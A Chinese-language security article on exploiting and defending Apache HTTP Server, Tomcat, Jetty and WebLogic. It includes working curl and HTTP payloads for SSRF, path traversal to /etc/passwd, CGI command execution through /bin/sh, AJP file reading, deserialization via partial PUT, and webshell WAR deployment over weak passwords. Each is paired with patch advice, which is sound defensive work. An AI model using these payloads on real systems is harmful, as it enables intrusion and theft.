@@ -1,0 +1,179 @@
+在当今的企业级应用架构中，Web 中间件作为承上启下的关键组件，负责处理 HTTP 请求、执行动态脚本或托管 Java 应用。然而，中间件自身的漏洞或配置缺陷，往往成为攻击者突破防线的重要入口。本文聚焦于四种广泛使用的中间件——Apache HTTP Server、Apache Tomcat、Eclipse Jetty 和 Oracle WebLogic，深入剖析其高危漏洞的原理、利用方式，并提供针对性的防御建议，旨在帮助安全人员与运维者构建更坚固的防线。
+
+---
+
+一、Apache HTTP Server：流行 Web 服务器下的阴影
+
+Apache 是全球使用最广泛的 Web 服务器之一，其模块化设计和高稳定性备受青睐。但 2021 年曝出的两个严重漏洞，让管理员不得不重新审视版本管理的重要性。
+
+1. SSRF 漏洞（CVE-2021-40438）
+
+· 影响版本：2.4.48 及更低版本（2.4.49 已修复）
+· 漏洞原理：Apache 的 mod_proxy 模块在配置为反向代理时，未对 ProxyPass 指令的请求路径进行充分校验。攻击者可构造特制的请求，迫使服务器将请求转发到内网任意地址，形成服务器端请求伪造（SSRF）。
+· 利用条件：服务器必须启用了 mod_proxy 并配置了 ProxyPass 或 RewriteRule 代理规则。
+· 实践验证：
+  ```bash
+  # 发送恶意请求，使 Apache 将请求转发至内网的 127.0.0.1:8080
+  curl -v 'http://target.com/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://127.0.0.1:8080/admin'
+  ```
+· 修复建议：升级至 Apache 2.4.49 及以上版本；若无法升级，在 ProxyPass 中禁用对 unix: 协议的支持。
+
+2. 路径穿越漏洞（CVE-2021-41773 与 CVE-2021-42013）
+
+· 影响版本：
+  · CVE-2021-41773：2.4.49
+  · CVE-2021-42013：2.4.50（对 41773 的补丁绕过）
+· 漏洞原理：Apache 在 2.4.49 中引入了一个路径规范化缺陷，攻击者使用 /.%%32%65/（即 URL 编码的 ..）绕过访问控制，读取文件系统上的任意文件。后续补丁未完全修复，导致 2.4.50 中可利用 /.%%32%65/ 的双重编码变体绕过。
+· 利用方式：
+  · 文件读取：
+    ```bash
+    curl -v --path-as-is 'http://target:19615/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+    ```
+  · 若服务器启用了 CGI，可进一步执行命令：
+    ```bash
+    curl -v --data "echo;id" 'http://target:19615/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
+    ```
+· 修复建议：立即升级至 2.4.51 或更高版本；禁用不必要的 CGI 模块，并严格限制 /icons 等目录的访问权限。
+
+---
+
+二、Apache Tomcat：Java 应用服务器的三重危机
+
+作为主流的 Java Servlet 容器，Tomcat 的漏洞往往直接威胁业务安全。除经典的弱口令控制台利用外，近年曝出的 AJP 协议漏洞和反序列化漏洞同样值得警惕。
+
+1. 控制台弱口令与 War 后门部署
+
+· 利用条件：Tomcat 管理后台（/manager/html）存在弱口令（如 tomcat/tomcat、admin/admin）。
+· 攻击流程：
+  1. 爆破或猜测出登录凭证。
+  2. 将 Webshell（如 1.jsp）打包为 WAR 文件：jar cvf shell.war 1.jsp。
+  3. 登录管理后台，在“WAR file to deploy”处上传 shell.war。
+  4. 访问 http://target:8080/shell/1.jsp 即可执行命令。
+· 防御：删除或修改默认管理员账户；限制管理页面的访问 IP；使用强密码并启用访问日志审计。
+
+2. AJP 文件包含漏洞（CVE-2020-1938，又名 Ghostcat）
+
+· 影响版本：
+  · Tomcat 6.x
+  · Tomcat 7.x < 7.0.100
+  · Tomcat 8.x < 8.5.51
+  · Tomcat 9.x < 9.0.31
+· 漏洞原理：Tomcat 的 AJP 协议（默认 8009 端口）在处理请求时，未对请求属性进行充分过滤，攻击者可构造包含恶意属性的 AJP 请求，读取 Web 应用目录下的任意文件（如 WEB-INF/web.xml）。若服务器同时存在文件上传功能，可进一步结合文件包含实现 RCE。
+· 利用工具：
+  ```bash
+  # 使用 CNVD-2020-10487-Tomcat-Ajp-lfi 脚本读取 web.xml
+  python CNVD-2020-10487-Tomcat-Ajp-lfi.py target_ip -p 8009 -f WEB-INF/web.xml
+  ```
+· 修复建议：升级至修复版本；若无法升级，禁用 AJP 端口或配置 secretRequired 属性为 true。
+
+3. 远程代码执行漏洞（CVE-2025-24813）
+
+· 影响版本：
+  · 11.0.0-M1 ≤ 11.0.2
+  · 10.1.0-M1 ≤ 10.1.34
+  · 9.0.0.M1 ≤ 9.0.98
+· 漏洞条件与利用：该漏洞需要多个非默认配置组合，但一旦满足，可导致敏感文件读写甚至 RCE。
+  · 条件 A（敏感文件修改）：
+    · DefaultServlet 启用写入权限（默认关闭）
+    · 服务器开启 partial PUT（默认开启）
+    · 攻击者能在目标敏感文件的上级目录通过 partial PUT 上传文件，且知道完整路径。
+  · 条件 B（RCE）：
+    · 满足条件 A 的所有前提
+    · Tomcat 使用基于文件的 Session 持久化（默认内存持久化）
+    · 应用包含可利用的反序列化库（如 Commons-Collections 3.x）
+  · 利用步骤（以 RCE 为例）：
+    1. 通过 partial PUT 上传序列化数据：
+       ```http
+       PUT /deserialize/session HTTP/1.1
+       Host: 192.168.1.7:8080
+       Content-Range: bytes 0-5/10
+       
+       [序列化 payload 的前 6 字节]
+       ```
+       可使用 Yakit 或 Burp 分段上传完整的反序列化 payload。
+    2. 触发反序列化：
+       ```http
+       GET / HTTP/1.1
+       Host: 192.168.1.7:8080
+       Cookie: JSESSIONID=.deserialize
+       ```
+· 修复建议：升级至已修复版本（如 9.0.99 以上）；若无必要，禁用 DefaultServlet 的写入权限；避免使用基于文件的 Session 持久化；及时移除不必要的反序列化库。
+
+---
+
+三、Eclipse Jetty：轻量级容器的信息泄露隐患
+
+Jetty 因其轻量、嵌入式的特性被广泛用于微服务架构。然而 2021 年曝出的两个信息泄露漏洞，暴露了其在 URI 编码处理上的缺陷。
+
+1. ConcatServlet 信息泄露（CVE-2021-28169）
+
+· 影响版本：≤ 9.4.40、≤ 10.0.2、≤ 11.0.2
+· 漏洞原理：Jetty 的 ConcatServlet 用于合并多个静态资源，但未能正确处理双重编码的路径。攻击者可通过 /%2557EB-INF/web.xml 绕过保护，读取 WEB-INF 目录下的敏感文件。
+· 利用示例：
+  ```bash
+  curl -v 'http://target:16187/static?/%2557EB-INF/web.xml'
+  ```
+· 修复建议：升级至 9.4.41、10.0.3 或 11.0.3 以上版本；若无法升级，禁用 ConcatServlet 或限制其访问路径。
+
+2. URI 编码绕过（CVE-2021-34429）
+
+· 影响版本：9.4.37-9.4.42、10.0.1-10.0.5、11.0.1-11.0.5
+· 漏洞原理：Jetty 在规范化 URI 时，未正确处理 Unicode 编码形式（如 %u002e 表示点），攻击者可构造 /%u002e/WEB-INF/web.xml 绕过安全限制，读取受保护资源。
+· 利用示例：
+  ```http
+  GET /%u002e/WEB-INF/web.xml HTTP/1.1
+  Host: target:8080
+  ```
+· 修复建议：升级至 9.4.43、10.0.6 或 11.0.6 及以上版本；使用 WAF 拦截包含 %u 编码的异常请求。
+
+---
+
+四、Oracle WebLogic：企业级应用的重灾区
+
+WebLogic 作为复杂的 Java EE 应用服务器，历史上曾曝出大量反序列化 RCE 漏洞，配合弱口令管理后台，常成为攻防演练中的突破口。
+
+1. 弱口令与 Webshell 部署
+
+· 默认口令：WebLogic 常见默认密码可参考 cirt.net/passwords。例如 weblogic/Oracle@123 等。
+· 利用步骤：
+  1. 登录控制台（通常端口 7001，路径 /console）。
+  2. 进入“部署” -> “安装” -> 上传包含 JSP 后门的 WAR 包。
+  3. 修改应用访问路径，部署后访问 http://target:7001/应用名/后门.jsp。
+· 防御：修改所有默认口令；控制台绑定至内网或使用 VPN；启用双因素认证。
+
+2. 多个 JNDI/JRMP 反序列化 RCE
+
+WebLogic 历史上出现过多个基于 T3 协议或 IIOP 协议的反序列化漏洞，例如：
+
+· CVE-2023-21839、CVE-2020-14882（未授权访问 + RCE）
+· CVE-2020-2551、CVE-2018-2628（JRMP 反序列化）
+· CVE-2017-10271（XMLDecoder 反序列化）
+
+利用工具：可使用集成化工具如 WeblogicTool 快速检测并利用上述漏洞。该工具支持多种 CVE 的 JNDI 或 JRMP 注入，直接获取服务器权限。
+
+防御策略：
+
+· 及时安装 Oracle 关键补丁更新（CPU）。
+· 禁用不必要的 T3/IIOP 协议，或通过防火墙限制 7001、7002 端口的访问。
+· 使用 RASP 或 WAF 对反序列化流量进行拦截。
+
+---
+
+五、总结：中间件安全防御体系构建
+
+从上述案例可以看出，中间件攻击手法主要集中在以下三类：
+
+1. 配置不当：如弱口令、管理后台暴露、默认协议开启。
+2. 组件漏洞：如路径穿越、文件包含、反序列化。
+3. 协议实现缺陷：如 AJP 协议、T3 协议的不安全处理。
+
+通用防御建议
+
+· 版本管理：建立中间件资产清单，定期关注官方安全公告，及时升级至稳定修复版本。
+· 最小化配置：禁用不需要的模块（如 mod_proxy、AJP）、协议（T3、IIOP）和服务（如管理控制台）。
+· 权限控制：严格控制文件系统权限，避免 Web 进程拥有过高权限；对上传目录禁用执行权限。
+· 网络隔离：将中间件部署在独立的网络区域，通过防火墙限制对管理端口和内部端口的访问。
+· 纵深防御：部署 WAF、RASP 等安全产品，对异常请求（如路径遍历、反序列化 payload）进行实时检测与拦截。
+· 定期演练：通过漏洞扫描和渗透测试，主动发现中间件层面的安全隐患，并在实战中检验防御有效性。
+
+安全无小事，中间件作为应用的基石，任何疏忽都可能被攻击者放大为突破口。只有深入理解漏洞原理，结合持续的监控与更新，才能确保企业应用在复杂的网络环境中稳健运行。
